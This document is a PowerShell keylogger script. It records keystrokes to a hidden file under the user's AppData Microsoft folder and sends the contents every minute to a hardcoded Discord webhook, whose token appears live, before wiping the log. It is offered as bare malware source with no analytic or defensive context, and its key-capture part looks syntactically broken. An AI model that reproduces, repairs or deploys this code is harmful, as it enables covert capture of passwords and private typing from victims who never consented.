# Config
$logFile = "$env:APPDATA\Microsoft\keylog.txt"
$webhookUrl = "https://discord.com/api/webhooks/1400154362399031406/DGLbSSN0EwdtdwbfECMX3S7WveKMCmsxGyXGfDFEzQFjiOl9dzlNoebvkt_yMi4pxSQs"

# Setup
Add-Type -AssemblyName System.Windows.Forms
$global:pressedKeys = ""

# Timer: every 60 seconds, send the log
$timer = New-Object Timers.Timer
$timer.Interval = 60000
$timer.AutoReset = $true
$timer.Enabled = $true
Register-ObjectEvent -InputObject $timer -EventName Elapsed -Action {
    if (Test-Path $logFile) {
        $content = Get-Content $logFile -Raw
        if ($content.Length -gt 0) {
            $json = @{
                "content" = "**Keylog update**`n```\n$content\n```"
            } | ConvertTo-Json
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $json -ContentType 'application/json'
            Clear-Content $logFile
        }
    }
}

# Keylogger logic
[System.Windows.Forms.Application]::AddMessageFilter([System.Windows.Forms.IMessageFilter]{
    PreFilterMessage = {
        $msg = $_.Msg
        $wParam = $_.WParam.ToInt32()
        if ($msg -eq 0x100) {
            $key = [System.Windows.Forms.Keys]$wParam
            Add-Content -Path $logFile -Value $key
        }
        return $false
    }
})

# Run
[System.Windows.Forms.Application]::Run()
